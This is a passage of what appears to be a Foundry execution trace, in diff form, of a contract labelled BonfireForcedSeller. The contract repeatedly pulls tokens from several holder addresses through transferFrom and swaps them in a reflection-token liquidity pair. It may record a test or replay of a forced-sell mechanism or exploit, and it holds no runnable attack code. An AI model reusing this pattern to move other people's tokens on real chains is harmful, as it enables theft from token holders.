+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000169ea3caac7652e78
+    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000d889f456b9ce45af200000000000000000000000000000000000000000000000031911a7cf1df3a6500000000000000000000000000000000000000000000000169ea3caac7652e78
+    │   │   │   ├─ emit SwapAndLiquify(: 250000000000000000000 [2.5e20], : 3571665103417719397 [3.571e18], : 250000000000000000000 [2.5e20])
+    │   │   │   ├─ emit Transfer(from: 0xB5FA67EaA51b82dcf807021714af6E9469a8C60a, to: 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, amount: 32214187126397424374 [3.221e19])
+    │   │   │   ├─ emit Approval(owner: 0xB5FA67EaA51b82dcf807021714af6E9469a8C60a, spender: 0x17e801E17CeFC6334059189c178D4783830E03D3, amount: 115792089237316195423570985008687907853269984665640564039421790466661576946187 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 10: 0xb5e5fed588b5da7cd91175923caf1b290fa905482ab4d92b8b0dbdd560508c26 → 0xb5e5e97fe381d8d7a565733214645b5ed46b1d179839165e4a2dc7b35b288543
+    │   │   │   │   @ 0xd506f4495fb33e52df08a8807e5e6a6ddb260b96689d8a7265416641576e1ef3: 0x00075adfabda70389630c939cdb6e456ee3ee75827239d5074a95f3ddec6c630 → 0x00077035510e71ddc9dccb99f601a421297ccf88b99f601db589555fe3eecd13
+    │   │   │   │   @ 0x35e36d92b66eed4bd568231aba0c67c002e151fb2880d14947e9a6226c15661f: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffffe0f43cbdfbfe9320b
+    │   │   │   │   @ 11: 0x00000000000000000000000000000000000000000000485cb34523fe98de5f97 → 0x00000000000000000000000000000000000000000000485ccc1b59cd02791d16
+    │   │   │   │   @ 0xea314ef73431ede908c8da6476f47dc1b0413058ab60cf1a92b32e0b1395e161: 0x00000000000000000000000000000000000000000000000004d0fddf8c198a46 → 0x00000000000000000000000000000000000000000000000d8d726b7177a80000
+    │   │   │   │   @ 0x0e70f7349d87c30a3bb207941a643cb71811eac6aa218ed7bbfaa27889f37af8: 0x4a91f3c0c85dbe5a635f69b838d8f9fd22161d6a01ef1ec38bdb284de0bb33a2 → 0x4a9373c66605dbf8057e73b1ba90fd654cff9f7579944ac28d929bc2d7bd3480
+    │   │   │   │   @ 0x692dbf6b4d254fe0e93c3d2db755843dcc5a1f6d1a795f5617bce504704d1fff: 0x0001da12fc22b698db536e6a009aa4425cb0da128daf940b8c32f5e8565e5d30 → 0x00002f62141295b0d1dc5fb02e4d2145bb4b87a5f112e27208bb962f550c4e8c
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [494] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000056cfb15ee80292d85b0900000000000000000000000000000000000000000000013df1cafd421ff9c7ef000000000000000000000000000000000000000000000000000000006aa90cb4
+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   └─ ← [Return] 409987722390686739323308 [4.099e23]
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   └─ ← [Return] 409987722390686739323308 [4.099e23]
+    │   │   ├─ [557] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token1() [staticcall]
+    │   │   │   └─ ← [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
+    │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   └─ ← [Return] 5865040887934810179567 [5.865e21]
+    │   │   ├─ [494] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000056cfb15ee80292d85b0900000000000000000000000000000000000000000000013df1cafd421ff9c7ef000000000000000000000000000000000000000000000000000000006aa90cb4
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [366] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::totalSupply() [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    │   │   ├─ [2703] 0xf33D46ecBB9fEdF80F8fEeBa8eb9d3c1053d3f91::computeSwapAmountsWithReflection(5865040887934810179567 [5.865e21], 409987722390686739323308 [4.099e23], 5865040887934810179567 [5.865e21], 409954774457937640839945 [4.099e23], 5, 1000000000000000000000000 [1e24], 2) [staticcall]
+    │   │   │   ├─ [1848] 0x122f7B4504DdFf2151636811fC9E6DB066f6d437::computeSwapAmountsWithReflection(5865040887934810179567 [5.865e21], 409987722390686739323308 [4.099e23], 5865040887934810179567 [5.865e21], 409954774457937640839945 [4.099e23], 5, 1000000000000000000000000 [1e24], 2) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001d1af047d31fda0cd
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001d1af047d31fda0cd
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   └─ ← [Return] 4464109799932115294031 [4.464e21]
+    │   │   ├─ [29100] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::swap(33556044284316983501 [3.355e19], 0, BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
+    │   │   │   ├─ [13946] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::transfer(BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 33556044284316983501 [3.355e19])
+    │   │   │   │   ├─ emit Transfer(from: 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, to: BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 30200439855885285151 [3.02e19])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 11: 0x00000000000000000000000000000000000000000000485ccc1b59cd02791d16 → 0x00000000000000000000000000000000000000000000485ce3641a06782c31ed
+    │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x00cfe01695233e32c1a2a3fb92f35b2d7dae7eb7f5acd9773125151046db9c39 → 0x00d1481a95044268ef0d11abf7a2a21cf740de5bd442e3ae8fbf471534490345
+    │   │   │   │   │   @ 0x0e70f7349d87c30a3bb207941a643cb71811eac6aa218ed7bbfaa27889f37af8: 0x4a9373c66605dbf8057e73b1ba90fd654cff9f7579944ac28d929bc2d7bd3480 → 0x4a91e3c1f4612c9f61412eb20a395bdc6587c1f6f813a918520413f812f2c09c
+    │   │   │   │   │   @ 0xd506f4495fb33e52df08a8807e5e6a6ddb260b96689d8a7265416641576e1ef3: 0x00077035510e71ddc9dccb99f601a421297ccf88b99f601db589555fe3eecd13 → 0x0007843589f0476f054637419bd5d16de06f8e760b14abd724038042cf9d537f
+    │   │   │   │   │   @ 10: 0xb5e5e97fe381d8d7a565733214645b5ed46b1d179839165e4a2dc7b35b288543 → 0xb5e5d57faaa0034669fc078a6e902e121d785e2a46c3caa4dbb39cd06f79fed7
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   │   └─ ← [Return] 409954854169564476570635 [4.099e23]
+    │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   │   └─ ← [Return] 5865040887934810179567 [5.865e21]
+    │   │   │   ├─ emit Sync(reserve0: 409954854169564476570635 [4.099e23], reserve1: 5865040887934810179567 [5.865e21])
+    │   │   │   ├─ emit Swap(sender: 0x17e801E17CeFC6334059189c178D4783830E03D3, amount0In: 33635755911152714191 [3.363e19], amount1In: 0, amount0Out: 33556044284316983501 [3.355e19], amount1Out: 0, to: BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 8: 0x6aa90cb400000000013df1cafd421ff9c7ef0000000056cfb15ee80292d85b09 → 0x6aa90cb400000000013df1cafd421ff9c7ef0000000056cfb27a194ff4db7c0b
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   └─ ← [Return] 4494317780364323864105 [4.494e21]
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001d1af047d31fda0cd
+    │   ├─ [6222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0x0e209754d8Ad3d277f94288a5FC10854e11e9636) [staticcall]
+    │   │   └─ ← [Return] 9904899943771420257 [9.904e18]
+    │   ├─ [86526] 0x17e801E17CeFC6334059189c178D4783830E03D3::transfer(0x0e209754d8Ad3d277f94288a5FC10854e11e9636, 8914921028910356181 [8.914e18], BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1789463732 [1.789e9])
+    │   │   ├─ [24235] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::transferFrom(0x0e209754d8Ad3d277f94288a5FC10854e11e9636, 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, 8914921028910356181 [8.914e18])
+    │   │   │   ├─ emit Transfer(from: 0x0e209754d8Ad3d277f94288a5FC10854e11e9636, to: 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, amount: 8023428926019320563 [8.023e18])
+    │   │   │   ├─ emit Approval(owner: 0x0e209754d8Ad3d277f94288a5FC10854e11e9636, spender: 0x17e801E17CeFC6334059189c178D4783830E03D3, amount: 115792089237316195423570985008687907853269984665640564039448669086884219283754 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 10: 0xb5e5d57faaa0034669fc078a6e902e121d785e2a46c3caa4dbb39cd06f79fed7 → 0xb5e5d02f5dba03d7d2bb5f9ba2527ee170f3cc3a3d9a3fe24232f358b946825a
+    │   │   │   │   @ 11: 0x00000000000000000000000000000000000000000000485ce3641a06782c31ed → 0x00000000000000000000000000000000000000000000485ce993b5b2889d9fde
+    │   │   │   │   @ 0xe8746423fd9ab5c3e5730a49e3b998c07ca273fb5e2c915bba99bdcb437339e1: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffffff8447d68eb723692a
+    │   │   │   │   @ 0xd506f4495fb33e52df08a8807e5e6a6ddb260b96689d8a7265416641576e1ef3: 0x0007843589f0476f054637419bd5d16de06f8e760b14abd724038042cf9d537f → 0x00078985d6d646dd9c86df306813809e8cf42066143e3699bd8429ba85d0cffc
+    │   │   │   │   @ 0x33f332f589ef3a201b7d36f6fd94e2cda9c738a98935bc1557c8fce79ef00d4f: 0x000076132a19aa7fa452b2fffbe2a3a3800268b641796bd1fb89a70424acc78b → 0x00000bcd2821b5dbd344b871637ad44fa942a0d028bd1ce6e12e6e4d6c59f27a
+    │   │   │   │   @ 0x0e70f7349d87c30a3bb207941a643cb71811eac6aa218ed7bbfaa27889f37af8: 0x4a91e3c1f4612c9f61412eb20a395bdc6587c1f6f813a918520413f812f2c09c → 0x4a9243675c8d226603cdd9630a25cccee33e65fcfe7ce27e395df9bf5ede9cb3
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [494] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000056cfb27a194ff4db7c0b00000000000000000000000000000000000000000000013df1cafd421ff9c7ef000000000000000000000000000000000000000000000000000000006aa90cb4
+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   └─ ← [Return] 409963060337905880033314 [4.099e23]
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   └─ ← [Return] 409963060337905880033314 [4.099e23]
+    │   │   ├─ [557] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token1() [staticcall]
+    │   │   │   └─ ← [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
+    │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   └─ ← [Return] 5865040887934810179567 [5.865e21]
+    │   │   ├─ [494] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000056cfb27a194ff4db7c0b00000000000000000000000000000000000000000000013df1cafd421ff9c7ef000000000000000000000000000000000000000000000000000000006aa90cb4
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [366] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::totalSupply() [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    │   │   ├─ [2703] 0xf33D46ecBB9fEdF80F8fEeBa8eb9d3c1053d3f91::computeSwapAmountsWithReflection(5865040887934810179567 [5.865e21], 409963060337905880033314 [4.099e23], 5865040887934810179567 [5.865e21], 409954854169564476570635 [4.099e23], 5, 1000000000000000000000000 [1e24], 2) [staticcall]
+    │   │   │   ├─ [1848] 0x122f7B4504DdFf2151636811fC9E6DB066f6d437::computeSwapAmountsWithReflection(5865040887934810179567 [5.865e21], 409963060337905880033314 [4.099e23], 5865040887934810179567 [5.865e21], 409954854169564476570635 [4.099e23], 5, 1000000000000000000000000 [1e24], 2) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000073fc41f201305754
+    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000073fc41f201305754
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   └─ ← [Return] 4494319783689621377227 [4.494e21]
+    │   │   ├─ [29100] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::swap(8357627516150634324 [8.357e18], 0, BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
+    │   │   │   ├─ [13946] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::transfer(BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 8357627516150634324 [8.357e18])
+    │   │   │   │   ├─ emit Transfer(from: 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, to: BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 7521864764535570892 [7.521e18])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x0e70f7349d87c30a3bb207941a643cb71811eac6aa218ed7bbfaa27889f37af8: 0x4a9243675c8d226603cdd9630a25cccee33e65fcfe7ce27e395df9bf5ede9cb3 → 0x4a91dfc6144b4c191615571c7607105eb20c73de315ba0645deb49ac8457d58b
+    │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x00d1481a95044268ef0d11abf7a2a21cf740de5bd442e3ae8fbf471534490345 → 0x00d1a1c5560c501491cd1214889bbe7c82d009e10ff99ef3465664e53732425d
+    │   │   │   │   │   @ 10: 0xb5e5d02f5dba03d7d2bb5f9ba2527ee170f3cc3a3d9a3fe24232f358b946825a → 0xb5e5cb341a1d1f872d3f1eaca0bfaed91e2268ed74e4fc77afc52a374d77be52
+    │   │   │   │   │   @ 0xd506f4495fb33e52df08a8807e5e6a6ddb260b96689d8a7265416641576e1ef3: 0x00078985d6d646dd9c86df306813809e8cf42066143e3699bd8429ba85d0cffc → 0x00078e811a732b2e4203201f69a650a6dfc583b2dcf37a044ff1f2dbf19f9404
+    │   │   │   │   │   @ 11: 0x00000000000000000000000000000000000000000000485ce993b5b2889d9fde → 0x00000000000000000000000000000000000000000000485cef6052983be00aa2
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   │   └─ ← [Return] 409954874022896505090326 [4.099e23]
+    │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   │   └─ ← [Return] 5865040887934810179567 [5.865e21]
+    │   │   │   ├─ emit Sync(reserve0: 409954874022896505090326 [4.099e23], reserve1: 5865040887934810179567 [5.865e21])
+    │   │   │   ├─ emit Swap(sender: 0x17e801E17CeFC6334059189c178D4783830E03D3, amount0In: 8377480848179154015 [8.377e18], amount1In: 0, amount0Out: 8357627516150634324 [8.357e18], amount1Out: 0, to: BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 8: 0x6aa90cb400000000013df1cafd421ff9c7ef0000000056cfb27a194ff4db7c0b → 0x6aa90cb400000000013df1cafd421ff9c7ef0000000056cfb2c0a1d008067116
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   └─ ← [Return] 4501843529690724805514 [4.501e21]
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000073fc41f201305754
+    │   ├─ [6222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0x7a8A1060CC281D0263Dc45B0ff5B98a6cD3b9Acd) [staticcall]
+    │   │   └─ ← [Return] 9865718291200239415 [9.865e18]
+    │   ├─ [86526] 0x17e801E17CeFC6334059189c178D4783830E03D3::transfer(0x7a8A1060CC281D0263Dc45B0ff5B98a6cD3b9Acd, 8879656371956250055 [8.879e18], BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1789463732 [1.789e9])
+    │   │   ├─ [24235] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::transferFrom(0x7a8A1060CC281D0263Dc45B0ff5B98a6cD3b9Acd, 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, 8879656371956250055 [8.879e18])
+    │   │   │   ├─ emit Transfer(from: 0x7a8A1060CC281D0263Dc45B0ff5B98a6cD3b9Acd, to: 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, amount: 7991690734760625051 [7.991e18])
+    │   │   │   ├─ emit Approval(owner: 0x7a8A1060CC281D0263Dc45B0ff5B98a6cD3b9Acd, spender: 0x17e801E17CeFC6334059189c178D4783830E03D3, amount: 115792089237316195423570985008687907853269984665640564039448704351541173389880 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x00f13131c3b979d24d0ee5719e1ba67353a2d9abac08b11b3ca25ad3bc7eaba2: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffffff84c51f937e038a38
+    │   │   │   │   @ 0xd506f4495fb33e52df08a8807e5e6a6ddb260b96689d8a7265416641576e1ef3: 0x00078e811a732b2e4203201f69a650a6dfc583b2dcf37a044ff1f2dbf19f9404 → 0x000793cc0588247649bd72b0c64d63c1c0f65b9335357c6746469c9bec4666ce
+    │   │   │   │   @ 0x0e70f7349d87c30a3bb207941a643cb71811eac6aa218ed7bbfaa27889f37af8: 0x4a91dfc6144b4c191615571c7607105eb20c73de315ba0645deb49ac8457d58b → 0x4a923f0a9bc4d329a13c07d7d4e13991684b23474f31acf505e38bbd98dd04e0
+    │   │   │   │   @ 11: 0x00000000000000000000000000000000000000000000485cef6052983be00aa2 → 0x00000000000000000000000000000000000000000000485cf589aa9da8c643b8
+    │   │   │   │   @ 0x4abe37ab6c9371651f8c4a3056cc4dc83fc400d557f6f3a21e1acd23faba3ef7: 0x0000759b90f8b431911e71a53bbeab8fd935fffabe72177120daa03299788230 → 0x00000bc133553a90f6831bc723965c276095a0d0f018061a8c390aa18fa5ad47
+    │   │   │   │   @ 10: 0xb5e5cb341a1d1f872d3f1eaca0bfaed91e2268ed74e4fc77afc52a374d77be52 → 0xb5e5c5e92f08263f2584cc1b44189bbe3cf1910d1ca2fa14b970807752d0eb88
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [494] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000056cfb2c0a1d00806711600000000000000000000000000000000000000000000013df1cafd421ff9c7ef000000000000000000000000000000000000000000000000000000006aa90cb4
+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   └─ ← [Return] 409963047730180717910551 [4.099e23]
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   └─ ← [Return] 409963047730180717910551 [4.099e23]
+    │   │   ├─ [557] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token1() [staticcall]
+    │   │   │   └─ ← [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
+    │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   └─ ← [Return] 5865040887934810179567 [5.865e21]
+    │   │   ├─ [494] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000056cfb2c0a1d00806711600000000000000000000000000000000000000000000013df1cafd421ff9c7ef000000000000000000000000000000000000000000000000000000006aa90cb4
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [366] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::totalSupply() [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    │   │   ├─ [2703] 0xf33D46ecBB9fEdF80F8fEeBa8eb9d3c1053d3f91::computeSwapAmountsWithReflection(5865040887934810179567 [5.865e21], 409963047730180717910551 [4.099e23], 5865040887934810179567 [5.865e21], 409954874022896505090326 [4.099e23], 5, 1000000000000000000000000 [1e24], 2) [staticcall]
+    │   │   │   ├─ [1848] 0x122f7B4504DdFf2151636811fC9E6DB066f6d437::computeSwapAmountsWithReflection(5865040887934810179567 [5.865e21], 409963047730180717910551 [4.099e23], 5865040887934810179567 [5.865e21], 409954874022896505090326 [4.099e23], 5, 1000000000000000000000000 [1e24], 2) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007386cde444bc4e09
+    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007386cde444bc4e09
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
